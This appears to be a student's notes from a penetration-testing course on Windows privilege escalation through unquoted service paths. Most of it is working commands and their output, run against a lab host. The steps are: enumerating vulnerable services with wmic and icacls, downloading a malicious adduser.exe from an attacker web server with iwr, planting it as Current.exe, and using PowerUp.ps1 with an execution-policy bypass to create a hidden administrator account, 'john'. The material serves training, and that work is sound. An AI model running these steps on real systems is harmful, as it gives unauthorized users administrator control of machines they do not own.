# Unquoted Service Paths

In order to exploit this and subvert the original unquoted service
call, we must create a malicious executable, place it in a directory
that corresponds to one of the interpreted paths, and match its name
to the interpreted filename. Then, once the service is started, our
file gets executed with the same privileges that the service starts
with. Often, this happens to be the *LocalSystem* account, which
results in a successful privilege escalation attack.

In the context of the example, we could name our executable
**Program.exe** and place it in **C:\**, **My.exe** and place it in
**C:\Program Files\**, or **My.exe** and place it in **C:\Program
Files\My Program\**. However, the first two options would require
some unlikely permissions since standard users don't have the
permissions to write to these directories by default. The third
option is more likely as it is the software's main directory. If
an administrative user or developer set the permissions for this
directory too open, we can place our malicious binary there.

**Enumerating stopped services:**

```
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName

Name                      State   PathName
----                      -----   --------
...
GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

shows a stopped service named
*GammaService*. The unquoted service binary path contains multiple
spaces and is therefore potentially vulnerable to this attack vector.

A more effective way to identify spaces in the paths and missing
quotes is using the *WMI command-line* (WMIC)[3](https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276/leveraging-windows-services-47210/unquoted-service-paths-45286#fn-local_id_671-3) utility. We can
enter **service** to obtain service information and the verb **get**
with **name** and **pathname** as arguments to retrieve only these
specific property values. We'll pipe the output of this command to
**findstr** with **/i** for case-insensitive searching and **/v** to
only print lines that don't match. As the argument for this command,
we'll enter **"C:\Windows\"** to show only services with a binary
path outside of the Windows directory. We'll pipe the output of this
command to another **findstr** command, which uses **"""** as argument
to print only matches without quotes

**Using findstr to enumerate blank spaces in system:**

```
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName
...
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

**Checking if we can start and stop the services:**

```
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```

**Now, we can list out the paths one by one and then try to see our permissions for those paths:**

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

```
PS C:\Users\steve> icacls "C:\"
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)

Successfully processed 1 files; Failed processing 0 files

PS C:\Users\steve>icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
...

```

As expected, our user *steve*, as a member of *BUILTIN\Users*
and *NT AUTHORITY\AUTHENTICATED Users*, has no Write permissions in
either of these paths. Now, let's check the path of the third option.
We can skip the fourth path since it represents the service binary
itself.

```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
```

*BUILTIN\Users*
has Write (w) permissions on the path **C:\Program Files\Enterprise
Apps**. Our goal is now to place a malicious file named
**Current.exe** in **C:\Program Files\Enterprise Apps\**.

We can reuse the **adduser.exe** binary by compiling the C code from
the section "Service Binary Hijacking". On Kali, we start a Python3
web server in the directory of the executable file in order to serve
it.

Once the web server is running, we can download **adduser.exe** on
the target machine as *steve*. To save the file with the correct
name for our privilege escalation attack, we enter **Current.exe** as
argument for **-Outfile**. After the file is downloaded, we copy it to
**C:\Program Files\Enterprise Apps**

```
PS C:\Users\steve> iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe

PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

**After we start service Start-Service GammaService , we can see that user dave is added to local admin group**

# Automating attack with powerup

```
PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass
...

PS C:\Users\dave> . .\PowerUp.ps1

PS C:\Users\dave> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True

```

> Listing 75 - Using Get-UnquotedService to list potential vulnerable services
> 

Listing 75 shows that the GammaService was
identified as vulnerable. Let's use the AbuseFunction and restart
the service to attempt to elevate our privileges. For **-Path**,
we enter the same path for **Current.exe** as we did in Listing
73. As stated before, the default
behavior is to create a new local user called *john* with the
password *Password123!*. Additionally, the user is added to the local
*Administrators* group.

```
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...

PS C:\Users\steve> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand

PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount

The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
john
...

```